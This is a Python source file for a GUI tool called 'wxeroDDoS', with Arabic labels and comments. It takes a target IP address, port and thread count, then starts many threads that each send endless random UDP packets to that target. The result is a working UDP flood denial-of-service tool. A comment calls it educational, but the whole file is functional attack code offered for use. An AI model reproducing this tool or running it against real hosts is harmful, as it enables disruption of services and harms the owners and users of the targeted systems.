
import os
import threading
import time
import random
import socket
import tkinter as tk
from tkinter import messagebox
import pygame

# تشغيل الموسيقى الخلفية
pygame.mixer.init()
pygame.mixer.music.load("music.mp3")
pygame.mixer.music.play(-1)

# إعداد النافذة
window = tk.Tk()
window.title("wxeroDDoS")
window.geometry("500x350")
window.configure(bg="#0f0f0f")

# صوت النقرات
def play_click():
    click = pygame.mixer.Sound("click.wav")
    click.play()

# تنفيذ الهجوم (للأغراض التعليمية فقط)
def start_attack():
    play_click()
    target_ip = ip_entry.get()
    port = int(port_entry.get())
    try:
        threads = int(thread_entry.get())
    except:
        threads = 100

    if not target_ip or not port:
        messagebox.showerror("خطأ", "يرجى إدخال IP و Port")
        return

    def attack():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes_data = random._urandom(1024)
                sock.sendto(bytes_data, (target_ip, port))
            except:
                pass

    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

    messagebox.showinfo("تم", "الهجوم بدأ. الله يحفظ الجهاز فقط!")

# الواجهة
tk.Label(window, text="wxeroDDoS GUI", font=("Consolas", 18), bg="#0f0f0f", fg="#00ff00").pack(pady=10)
tk.Label(window, text="IP:", bg="#0f0f0f", fg="white").pack()
ip_entry = tk.Entry(window)
ip_entry.pack()

tk.Label(window, text="PORT:", bg="#0f0f0f", fg="white").pack()
port_entry = tk.Entry(window)
port_entry.pack()

tk.Label(window, text="THREADS:", bg="#0f0f0f", fg="white").pack()
thread_entry = tk.Entry(window)
thread_entry.insert(0, "200")
thread_entry.pack()

tk.Button(window, text="ابدأ الهجوم", command=start_attack, bg="#111", fg="#0f0", font=("Consolas", 12)).pack(pady=20)
tk.Label(window, text="Instagram: @wx.ero", bg="#0f0f0f", fg="#666").pack(side="bottom")

window.mainloop()
